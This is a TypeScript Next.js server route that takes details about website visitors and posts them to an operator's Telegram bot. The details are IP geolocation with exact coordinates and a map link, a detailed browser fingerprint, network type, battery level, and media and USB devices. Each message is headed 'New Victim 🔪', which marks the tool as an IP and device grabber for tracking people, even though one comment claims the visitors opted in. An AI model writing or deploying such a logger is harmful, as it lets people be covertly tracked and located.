import { NextResponse, type NextRequest } from "next/server";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

const WINDOW_MS = 60_000;
const MAX_EVENTS_PER_WINDOW = 30;
let windowStartedAt = Date.now();
let eventsInWindow = 0;

type VisitDetails = {
  path?: unknown;
  referrer?: unknown;
  visitTime?: unknown;
  ipInfo?: Record<string, unknown> | null;
  browser?: Record<string, unknown>;
  network?: Record<string, unknown>;
  battery?: unknown;
  mediaDevices?: unknown;
  usbDevices?: unknown;
};

function text(value: unknown, max = 350): string {
  let result: string;
  if (typeof value === "string") result = value;
  else if (typeof value === "number" || typeof value === "boolean") result = String(value);
  else result = "N/A";
  return result
    .replace(/[\r\n\u0000-\u001f]/g, " ")
    .slice(0, max)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function field(label: string, value: unknown, max = 350): string {
  return `• <b>${label}:</b> ${text(value, max)}`;
}

export async function POST(request: NextRequest) {
  // Accept only same-origin JSON requests generated after visitor opt-in.
  const origin = request.headers.get("origin");
  const host = request.headers.get("x-forwarded-host") ?? request.headers.get("host");
  if (!origin || !host) return NextResponse.json({ ok: false }, { status: 403 });
  try {
    if (new URL(origin).host !== host) {
      return NextResponse.json({ ok: false }, { status: 403 });
    }
  } catch {
    return NextResponse.json({ ok: false }, { status: 403 });
  }

  let details: VisitDetails;
  try {
    details = (await request.json()) as VisitDetails;
  } catch {
    return NextResponse.json({ ok: false }, { status: 400 });
  }
  if (
    typeof details.path !== "string" ||
    details.path.length > 160 ||
    !/^\/[\w\-/]*$/.test(details.path)
  ) {
    return NextResponse.json({ ok: false }, { status: 400 });
  }

  const now = Date.now();
  if (now - windowStartedAt >= WINDOW_MS) {
    windowStartedAt = now;
    eventsInWindow = 0;
  }
  if (eventsInWindow >= MAX_EVENTS_PER_WINDOW) {
    return NextResponse.json({ ok: false }, { status: 429 });
  }
  eventsInWindow += 1;

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return NextResponse.json({ ok: false }, { status: 503 });

  const ipInfo = details.ipInfo ?? {};
  const browser = details.browser ?? {};
  const network = details.network ?? {};
  const battery = typeof details.battery === "number" && details.battery >= 0 && details.battery <= 100
    ? `${Math.round(details.battery)}%`
    : "Unknown";
  const lat = typeof ipInfo.latitude === "number" ? ipInfo.latitude : null;
  const lon = typeof ipInfo.longitude === "number" ? ipInfo.longitude : null;
  const mapUrl = lat !== null && lon !== null
    ? `https://www.google.com/maps?q=${encodeURIComponent(`${lat},${lon}`)}`
    : null;

  const message = [
    "𝗡𝗲𝘄 𝗩𝗶𝗰𝘁𝗶𝗺 🔪",
    "",
    "𝗜𝗻𝘁𝗲𝗿𝗻𝗲𝘁 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:",
    "",
    field("IP", ipInfo.ip),
    field("Country", ipInfo.country_name),
    field("Region", ipInfo.region),
    field("City", ipInfo.city),
    field("Latitude", lat),
    field("Longitude", lon),
    field("Postal", ipInfo.postal),
    field("Timezone", ipInfo.timezone),
    field("ISP", ipInfo.org),
    field("Visit Time", details.visitTime),
    "",
    "𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:",
    "",
    field("Product Sub", browser.productSub),
    field("Vendor", browser.vendor),
    field("Max Touch Points", browser.maxTouchPoints),
    field("Do Not Track", browser.doNotTrack),
    field("Hardware Concurrency", browser.hardwareConcurrency),
    field("App Code Name", browser.appCodeName),
    field("App Name", browser.appName),
    field("App Version", browser.appVersion),
    field("Platform", browser.platform),
    field("User Agent", browser.userAgent, 500),
    field("Language", browser.language),
    field("Languages", Array.isArray(browser.languages) ? browser.languages.join(", ") : browser.languages),
    field("Webdriver", browser.webdriver),
    field("PDF Viewer Enabled", browser.pdfViewerEnabled),
    field("Device Memory", browser.deviceMemory),
    field("Android Version", browser.androidVersion),
    "",
    "𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:",
    "",
    field("Type", network.type),
    field("RTT", network.rtt),
    field("Save Data", network.saveData),
    field("Effective Type", network.effectiveType),
    field("Downlink", network.downlink),
    field("Max Downlink", network.downlinkMax),
    "",
    "𝗕𝗮𝘁𝘁𝗲𝗿𝘆 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:",
    "",
    field("Battery Level", battery),
    "",
    "𝗠𝗲𝗱𝗶𝗮 𝗗𝗲𝘃𝗶𝗰𝗲𝘀:",
    "",
    `• ${text(details.mediaDevices, 800)}`,
    "",
    "𝗨𝗦𝗕 𝗗𝗲𝘃𝗶𝗰𝗲𝘀:",
    "",
    `• ${text(details.usbDevices, 800)}`,
  ].join("\n").slice(0, 4_000);

  const telegramBody: Record<string, unknown> = {
    chat_id: chatId,
    text: message,
    parse_mode: "HTML",
  };
  if (mapUrl) {
    telegramBody.reply_markup = {
      inline_keyboard: [[{ text: "📍 View on Map", url: mapUrl }]],
    };
  }

  try {
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramBody),
        cache: "no-store",
        signal: AbortSignal.timeout(5_000),
      },
    );
    if (!telegramResponse.ok) return NextResponse.json({ ok: false }, { status: 502 });
    return new NextResponse(null, { status: 204 });
  } catch {
    return NextResponse.json({ ok: false }, { status: 502 });
  }
}
